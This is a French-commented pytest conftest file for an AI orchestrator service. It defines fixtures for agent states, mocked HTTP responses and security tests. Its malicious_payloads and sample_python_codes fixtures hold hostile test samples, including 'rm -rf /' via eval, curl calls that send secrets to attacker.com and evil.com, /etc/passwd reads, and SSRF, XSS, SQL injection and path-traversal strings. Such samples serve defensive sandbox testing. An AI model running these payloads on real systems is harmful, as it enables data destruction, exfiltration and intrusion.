"""
Configuration globale pour les tests avec fixtures partages.
Setup du framework de tests complet selon les spcifications.
"""

# CORRECTION IA-1 : Configuration environnement prioritaire
import os

# Configuration des variables d'environnement AVANT tous les autres imports
_test_env = {
    # API Keys pour les LLM (valeurs de test scurises)
    'OPENAI_API_KEY': 'sk-test-openai-key-12345678901234567890123456789012345678',
    'ANTHROPIC_API_KEY': 'sk-ant-test-anthropic-key-67890123456789012345678901234567890123456789012345678901234567890123456789012345',
    'ORCHESTRATOR_API_KEY': 'test-orchestrator-api-key-secure-123456789',
    
    # Configuration API
    'MEMORY_API_URL': 'http://localhost:8001',
    
    # Paramtres de scurit (optimiss pour les tests)
    'DEBUG': 'true',
    'ENFORCE_HTTPS': 'false',
    'MAX_REQUEST_TIMEOUT': '30.0',
    'MAX_LLM_RESPONSE_TIME': '120.0',
    'MAX_CODE_SIZE': '50000',
    'MAX_TASK_DESCRIPTION_LENGTH': '5000',
    
    # Configuration tests
    'ENVIRONMENT': 'testing',
    'SERVICE_VERSION': 'v9-test'
}

# Application immdiate des variables d'environnement
for key, value in _test_env.items():
    os.environ.setdefault(key, value)

import pytest
import asyncio
import os
import tempfile
import json
from pathlib import Path
from typing import Dict, Any, AsyncGenerator, Generator
from unittest.mock import Mock, AsyncMock, patch
import httpx
from fastapi.testclient import TestClient
import logging
from datetime import datetime

# Configuration logging tests
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('tests/logs/migration_tests.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('migration_tests')

# Configuration pytest pour tests async
pytest_plugins = ("pytest_asyncio",)


@pytest.fixture(scope="session")
def event_loop():
    """Cre un event loop pour la session de tests."""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()


@pytest.fixture
def temp_dir() -> Generator[Path, None, None]:
    """Cre un rpertoire temporaire pour les tests."""
    with tempfile.TemporaryDirectory() as temp_dir:
        yield Path(temp_dir)


@pytest.fixture
def mock_secrets_dir(temp_dir: Path) -> Path:
    """Cre un rpertoire de secrets temporaire pour les tests."""
    secrets_dir = temp_dir / ".secrets"
    secrets_dir.mkdir(mode=0o700)
    
    # Crer quelques secrets de test
    (secrets_dir / "openai_api_key.secret").write_text("sk-test-openai-key-12345")
    (secrets_dir / "anthropic_api_key.secret").write_text("sk-ant-test-anthropic-key-67890")
    (secrets_dir / "jwt_secret.secret").write_text("super-secret-jwt-key-for-testing-only")
    
    return secrets_dir


@pytest.fixture
def test_environment_variables():
    """Configure les variables d'environnement pour les tests."""
    original_env = os.environ.copy()
    
    # Variables de test - CORRECTION IA-1 : Variables directes pour Settings
    test_env = {
        'ENVIRONMENT': 'testing',
        'DEBUG': 'true',
        'OPENAI_API_KEY': 'sk-test-env-openai-key-12345',
        'ANTHROPIC_API_KEY': 'sk-ant-test-env-anthropic-key-67890',
        'ORCHESTRATOR_API_KEY': 'test-orchestrator-api-key-secure',
        'SECRET_OPENAI_API_KEY': 'sk-test-env-openai-key',
        'SECRET_ANTHROPIC_API_KEY': 'sk-ant-test-env-anthropic-key',
        'SECRET_JWT_SECRET': 'test-jwt-secret-from-env',
        'MEMORY_API_URL': 'http://localhost:8001',
        'SERVICE_VERSION': 'v9-test',
        'ENFORCE_HTTPS': 'false',
        'MAX_REQUEST_TIMEOUT': '30.0',
        'MAX_LLM_RESPONSE_TIME': '120.0',
        'MAX_CODE_SIZE': '50000',
        'MAX_TASK_DESCRIPTION_LENGTH': '5000'
    }
    
    # Mise  jour de l'environnement
    os.environ.update(test_env)
    
    yield test_env
    
    # Nettoyage
    os.environ.clear()
    os.environ.update(original_env)


@pytest.fixture
def sample_agent_state():
    """Fixture AgentState complte pour les tests - CORRECTION IA-1 dict  AgentState object."""
    from datetime import datetime
    from orchestrator.app.graph.state import AgentState
    
    return AgentState(
        messages=[{"role": "user", "content": "Test message"}],
        plan="Test execution plan",
        next="code_generation", 
        results={"analysis": "completed", "code": "print('hello')", "status": "success"},
        session_id="test-session-123456789",
        created_at=datetime.now(),
        updated_at=datetime.now(),
        task_description="Generate Python code for hello world",
        task_status="in_progress",
        code_context="# Starting code context",
        working_memory=["Previous analysis results", "Code generation in progress"],
        errors=[],
        logs=["Test log entry 1", "Test log entry 2"],
        feedback=None
    )


@pytest.fixture  
def sample_agent_state_completed():
    """AgentState avec rsultats complets - CORRECTION IA-1."""
    from datetime import datetime
    from orchestrator.app.graph.state import AgentState
    
    return AgentState(
        messages=[
            {"role": "user", "content": "Complete the task"},
            {"role": "assistant", "content": "Task completed successfully"}
        ],
        plan="1. Analyze requirements\n2. Generate code\n3. Test code",
        next="FINISH",
        results={
            "code_generation": {"code": "def hello():\n    print('Hello World!')", "status": "completed"},
            "documentation": {"doc": "## Hello Function\nPrints hello world", "status": "completed"},  
            "testing": {"tests": "def test_hello():\n    assert hello() is None", "status": "completed"}
        },
        session_id="test-session-completed-987654321", 
        created_at=datetime.now(),
        updated_at=datetime.now(),
        task_description="Create a complete hello world function with docs and tests",
        task_status="completed",
        code_context="# Full context with all results",
        working_memory=["Requirements analyzed", "Code generated", "Documentation written", "Tests created"],
        errors=[],
        logs=["Started task", "Code generation completed", "Documentation completed", "Tests completed"],
        feedback={"rating": 5, "comment": "Excellent work"}
    )


@pytest.fixture
def sample_agent_state_error():
    """AgentState avec erreurs - CORRECTION IA-1."""
    from datetime import datetime
    from orchestrator.app.graph.state import AgentState
    
    return AgentState(
        messages=[{"role": "user", "content": "Process invalid input"}],
        plan="Attempt to process input",
        next="error_handling",
        results={"error": "Invalid input provided"},
        session_id="test-session-error-555666777",
        created_at=datetime.now(), 
        updated_at=datetime.now(),
        task_description="Process malformed input",
        task_status="error",
        code_context="# Error context",
        working_memory=["Error detected in input"],
        errors=["ValueError: Invalid input format", "Processing failed"],
        logs=["Started processing", "Error encountered", "Error handling initiated"],
        feedback=None
    )


@pytest.fixture
def sample_task_descriptions() -> Dict[str, str]:
    """Descriptions de tches varies pour tests supervisor - CORRECTION IA-1."""
    return {
        'code_generation': 'Generate Python code for a calculator function',
        'documentation': 'Write comprehensive documentation for the API endpoints', 
        'testing': 'Create unit tests for the authentication module',
        'debugging': 'Debug the memory leak in the background worker process',
        'refactoring': 'Refactor the legacy codebase to use modern Python patterns',
        'optimization': 'Optimize the database queries for better performance',
        'analysis': 'Analyze the codebase architecture and provide recommendations',
        'integration': 'Integrate the payment gateway with the existing system',
        'deployment': 'Set up deployment pipeline for the microservices',
        'monitoring': 'Implement logging and monitoring for the production system'
    }


@pytest.fixture
def sample_python_codes() -> Dict[str, str]:
    """Codes Python d'exemple pour les tests."""
    return {
        'safe_code': '''
import json
import datetime
from typing import List, Dict

def process_data(data: Dict) -> List[str]:
    """Fonction sre de traitement de donnes."""
    result = []
    for key, value in data.items():
        if isinstance(value, str):
            result.append(f"{key}: {value}")
    return result

# Test basique
test_data = {"name": "test", "value": "123"}
print(process_data(test_data))
''',
        
        'malicious_eval': '''
import os
# Tentative d'excution de code malveillant
eval("__import__('os').system('rm -rf /')")
print("This should not execute")
''',
        
        'malicious_exec': '''
exec("import subprocess; subprocess.run(['curl', 'http://attacker.com/steal'])")
''',
        
        'malicious_import': '''
import subprocess
import os
import sys

# Tentative d'exfiltration
subprocess.run(['curl', '-X', 'POST', 'http://evil.com', '--data', os.environ.get('SECRET')])
''',
        
        'malicious_open': '''
# Tentative de lecture de fichiers sensibles
with open('/etc/passwd', 'r') as f:
    content = f.read()
    print(content)
''',
        
        'syntax_error': '''
def invalid_function(
    # Syntaxe invalide volontaire
    print("missing closing parenthesis"
''',
        
        'large_code': 'print("x")\\n' * 1000,  # Code volontairement large
        
        'infinite_loop': '''
while True:
    pass  # Boucle infinie pour tester le timeout
''',
        
        'complex_safe': '''
import json
import datetime
from dataclasses import dataclass
from typing import Optional, List, Dict, Any

@dataclass
class User:
    id: int
    name: str
    email: str
    created_at: datetime.datetime

class UserProcessor:
    def __init__(self):
        self.users: List[User] = []
    
    def add_user(self, user_data: Dict[str, Any]) -> Optional[User]:
        try:
            user = User(
                id=user_data['id'],
                name=user_data['name'],
                email=user_data['email'],
                created_at=datetime.datetime.now()
            )
            self.users.append(user)
            return user
        except KeyError as e:
            print(f"Missing required field: {e}")
            return None
    
    def get_user_by_id(self, user_id: int) -> Optional[User]:
        for user in self.users:
            if user.id == user_id:
                return user
        return None
    
    def export_users(self) -> str:
        users_data = []
        for user in self.users:
            users_data.append({
                'id': user.id,
                'name': user.name,
                'email': user.email,
                'created_at': user.created_at.isoformat()
            })
        return json.dumps(users_data, indent=2)

# Usage
processor = UserProcessor()
processor.add_user({'id': 1, 'name': 'John', 'email': 'john@example.com'})
print(processor.export_users())
'''
    }


@pytest.fixture
def malicious_payloads() -> Dict[str, Any]:
    """Payloads malveillants pour tests de scurit."""
    return {
        'code_injection': [
            "eval('__import__(\"os\").system(\"id\")')",
            "exec('import subprocess; subprocess.run([\"whoami\"])')",
            "__import__('os').system('ls -la')",
            "compile('malicious_code', '<string>', 'exec')",
        ],
        
        'ssrf_urls': [
            "http://127.0.0.1:22",
            "http://localhost:3306",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd",
            "gopher://localhost:25",
            "ftp://internal.company.com",
        ],
        
        'xss_payloads': [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "';alert('xss');//",
        ],
        
        'sql_injection': [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; INSERT INTO admin VALUES('hacker', 'password'); --",
            "' UNION SELECT password FROM users --",
        ],
        
        'path_traversal': [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ]
    }


@pytest.fixture
def mock_http_responses() -> Dict[str, Any]:
    """Rponses HTTP mockes pour les tests."""
    return {
        'memory_api_health': {
            'status_code': 200,
            'json': {'status': 'healthy', 'version': '1.0.0'}
        },
        
        'memory_api_rag_success': {
            'status_code': 200,
            'json': {
                'results': [
                    {'content': 'Sample code result 1', 'score': 0.95},
                    {'content': 'Sample code result 2', 'score': 0.87}
                ]
            }
        },
        
        'memory_api_timeout': {
            'exception': httpx.TimeoutException
        },
        
        'memory_api_connection_error': {
            'exception': httpx.ConnectError
        },
        
        'openai_models_success': {
            'status_code': 200,
            'json': {
                'data': [
                    {'id': 'gpt-4', 'object': 'model'},
                    {'id': 'gpt-3.5-turbo', 'object': 'model'}
                ]
            }
        },
        
        'openai_auth_failure': {
            'status_code': 401,
            'json': {'error': 'Invalid API key'}
        },
        
        'anthropic_success': {
            'status_code': 200,
            'json': {
                'content': [{'text': 'Hello!'}],
                'model': 'claude-3-haiku-20240307'
            }
        }
    }


@pytest.fixture
def mock_httpx_client():
    """Client HTTP mock pour les tests."""
    
    class MockResponse:
        def __init__(self, status_code: int, json_data: Dict[str, Any] = None, text: str = ""):
            self.status_code = status_code
            self._json_data = json_data or {}
            self.text = text
            self.content = text.encode()
            self.headers = {'content-type': 'application/json'}
        
        def json(self):
            return self._json_data
        
        def raise_for_status(self):
            if self.status_code >= 400:
                raise httpx.HTTPStatusError(
                    f"HTTP {self.status_code}",
                    request=Mock(),
                    response=self
                )
    
    class MockAsyncClient:
        def __init__(self, responses: Dict[str, Any]):
            self.responses = responses
            self.closed = False
        
        async def __aenter__(self):
            return self
        
        async def __aexit__(self, *args):
            self.closed = True
        
        async def get(self, url: str, **kwargs):
            # Simulation base sur l'URL
            if 'health' in url:
                return MockResponse(200, {'status': 'healthy'})
            elif 'openai.com/v1/models' in url:
                return MockResponse(200, {'data': [{'id': 'gpt-4'}]})
            else:
                return MockResponse(404, {'error': 'Not found'})
        
        async def post(self, url: str, **kwargs):
            if 'rag_query' in url:
                return MockResponse(200, {
                    'results': [{'content': 'Mock RAG result', 'score': 0.9}]
                })
            elif 'anthropic.com' in url:
                return MockResponse(200, {'content': [{'text': 'Hello!'}]})
            else:
                return MockResponse(404, {'error': 'Not found'})
    
    return MockAsyncClient


@pytest.fixture
async def test_app():
    """Application FastAPI de test."""
    # Import conditionnel pour viter les dpendances circulaires
    try:
        from orchestrator.app.main import app
        yield app
    except ImportError:
        # Mock app si l'import choue
        from fastapi import FastAPI
        mock_app = FastAPI()
        yield mock_app


@pytest.fixture
def test_client(test_app):
    """Client de test FastAPI."""
    return TestClient(test_app)


@pytest.fixture
def security_test_headers() -> Dict[str, str]:
    """Headers de test pour les endpoints scuriss."""
    return {
        'X-API-KEY': 'test-api-key-12345',
        'Content-Type': 'application/json',
        'User-Agent': 'TestClient/1.0'
    }


@pytest.fixture
def performance_monitor():
    """Moniteur de performance pour les tests."""
    import time
    
    class PerformanceMonitor:
        def __init__(self):
            self.start_time = None
            self.checkpoints = {}
        
        def start(self):
            self.start_time = time.time()
        
        def checkpoint(self, name: str):
            if self.start_time:
                self.checkpoints[name] = time.time() - self.start_time
        
        def get_duration_ms(self) -> float:
            if self.start_time:
                return (time.time() - self.start_time) * 1000
            return 0
        
        def assert_max_duration(self, max_ms: float):
            duration = self.get_duration_ms()
            assert duration <= max_ms, f"Performance test failed: {duration:.2f}ms > {max_ms}ms"
    
    return PerformanceMonitor()


@pytest.fixture
def log_capture():
    """Capture des logs pour les tests."""
    import logging
    from io import StringIO
    
    log_capture_string = StringIO()
    ch = logging.StreamHandler(log_capture_string)
    
    # Configuration du logger de test
    test_logger = logging.getLogger('tests')
    test_logger.setLevel(logging.DEBUG)
    test_logger.addHandler(ch)
    
    yield log_capture_string
    
    # Nettoyage
    test_logger.removeHandler(ch)


# Markers pour catgoriser les tests
def pytest_configure(config):
    """Configuration des markers de test."""
    config.addinivalue_line(
        "markers", "security: Tests de scurit"
    )
    config.addinivalue_line(
        "markers", "integration: Tests d'intgration"
    )
    config.addinivalue_line(
        "markers", "performance: Tests de performance"
    )
    config.addinivalue_line(
        "markers", "slow: Tests lents (>1s)"
    )
    config.addinivalue_line(
        "markers", "unit: Tests unitaires"
    )


# Hooks pytest pour reporting
def pytest_runtest_setup(item):
    """Setup avant chaque test."""
    if "security" in item.keywords:
        print(f"\n Running security test: {item.name}")


def pytest_runtest_teardown(item, nextitem):
    """Cleanup aprs chaque test."""
    if hasattr(item, "duration"):
        if item.duration > 1.0:
            print(f" Slow test detected: {item.name} took {item.duration:.2f}s")


# Configuration automatique de l'environnement - CORRECTION IA-1
@pytest.fixture(autouse=True)
def setup_test_environment(test_environment_variables):
    """
    Configuration automatique de l'environnement de test.
    CORRECTION IA-1 : Auto-application des variables d'environnement pour rsoudre les erreurs de collection.
    """
    # Les variables sont automatiquement configures par test_environment_variables
    yield
    # Cleanup automatique gr par test_environment_variables


# Configuration spcifique pour les tests de scurit
@pytest.fixture(autouse=True)
def security_test_isolation():
    """Isolation pour les tests de scurit."""
    # Reset des variables globales avant chaque test
    yield
    
    # Nettoyage aprs test
    import gc
    gc.collect()


@pytest.fixture
def assert_security_compliance():
    """Helper pour vrifier la conformit scurit."""
    
    def _assert_no_secrets_in_logs(log_content: str):
        """Vrifie qu'aucun secret n'apparat dans les logs."""
        sensitive_patterns = [
            r'sk-[a-zA-Z0-9]{48}',  # OpenAI API key
            r'sk-ant-[a-zA-Z0-9-]{95}',  # Anthropic API key
            r'password["\']?\s*[:=]\s*["\']?[^"\']*',
            r'api[_-]?key["\']?\s*[:=]\s*["\']?[^"\']*'
        ]
        
        import re
        for pattern in sensitive_patterns:
            assert not re.search(pattern, log_content, re.IGNORECASE), \
                f"Sensitive data detected in logs: {pattern}"
    
    def _assert_no_code_execution(result: str):
        """Vrifie qu'aucun code malveillant n'a t excut."""
        forbidden_outputs = [
            'root:x:0:0:root',  # /etc/passwd content
            'uid=',  # output of 'id' command
            'total ',  # output of 'ls -la'
        ]
        
        for forbidden in forbidden_outputs:
            assert forbidden not in result, \
                f"Forbidden command output detected: {forbidden}"
    
    return {
        'no_secrets_in_logs': _assert_no_secrets_in_logs,
        'no_code_execution': _assert_no_code_execution
    }


# Configuration logging pour les tests
@pytest.fixture(autouse=True)
def configure_test_logging():
    """Configure le logging pour les tests."""
    import logging
    
    # Rduire le niveau de logging pour les tests
    logging.getLogger('httpx').setLevel(logging.WARNING)
    logging.getLogger('urllib3').setLevel(logging.WARNING)
    
    # Logger spcifique pour les tests
    test_logger = logging.getLogger('tests')
    test_logger.setLevel(logging.DEBUG)
    
    yield test_logger


def pytest_addoption(parser):
    """Ajout options ligne commande"""
    parser.addoption(
        "--prod-env",
        action="store_true",
        default=False,
        help="Exécuter tests en environnement production"
    )
    parser.addoption(
        "--load-factor",
        type=float,
        default=1.5,
        help="Facteur multiplication charge (défaut: 1.5)"
    )
    parser.addoption(
        "--duration",
        type=str,
        default="7d",
        help="Durée minimale tests (ex: 7d pour 7 jours)"
    )


@pytest.fixture(scope="session")
def prod_env(request):
    """Fixture environnement production"""
    if request.config.getoption("--prod-env"):
        # Configuration env production
        os.environ["ENV"] = "production"
        os.environ["DB_HOST"] = "prod-db.example.com"
        os.environ["CACHE_HOST"] = "prod-cache.example.com"
        os.environ["QUEUE_HOST"] = "prod-queue.example.com"
        
        logger.info("🔧 Configuration environnement PRODUCTION")
        return True
    return False


@pytest.fixture(scope="session")
def load_factor(request):
    """Fixture facteur charge"""
    factor = request.config.getoption("--load-factor")
    logger.info(f"⚡ Configuration facteur charge: x{factor}")
    return factor


@pytest.fixture(scope="session")
def test_duration(request):
    """Fixture durée test"""
    duration_str = request.config.getoption("--duration")
    # Conversion durée en timedelta
    unit = duration_str[-1]
    value = int(duration_str[:-1])
    
    if unit == 'd':
        duration_days = value
    elif unit == 'h':
        duration_days = value / 24
    else:
        raise ValueError(f"Unité durée invalide: {unit}")
        
    logger.info(f"⏱️ Configuration durée test: {duration_days} jours")
    return duration_days


@pytest.fixture(scope="session", autouse=True)
def setup_test_env(prod_env, load_factor, test_duration):
    """Configuration globale environnement test"""
    if not prod_env:
        pytest.skip("Tests requièrent --prod-env")
        
    # Création répertoires logs
    log_dir = Path("tests/logs")
    log_dir.mkdir(parents=True, exist_ok=True)
    
    # Configuration métriques
    os.environ["METRICS_ENABLED"] = "true"
    os.environ["METRICS_INTERVAL"] = "10"  # secondes
    
    # Configuration monitoring
    os.environ["ALERT_THRESHOLD"] = "0.95"  # 95% seuil alerte
    os.environ["MONITORING_ENABLED"] = "true"
    
    logger.info(f"""
    🚀 Configuration environnement test:
    - Environnement: {'PRODUCTION' if prod_env else 'TEST'}
    - Facteur charge: x{load_factor}
    - Durée minimale: {test_duration} jours
    - Métriques: Activées
    - Monitoring: Activé
    """)
    
    yield
    
    logger.info("✅ Tests terminés")


@pytest.fixture(scope="session", autouse=True)
def setup_test_environment():
    """Configuration globale environnement de test"""
    yield




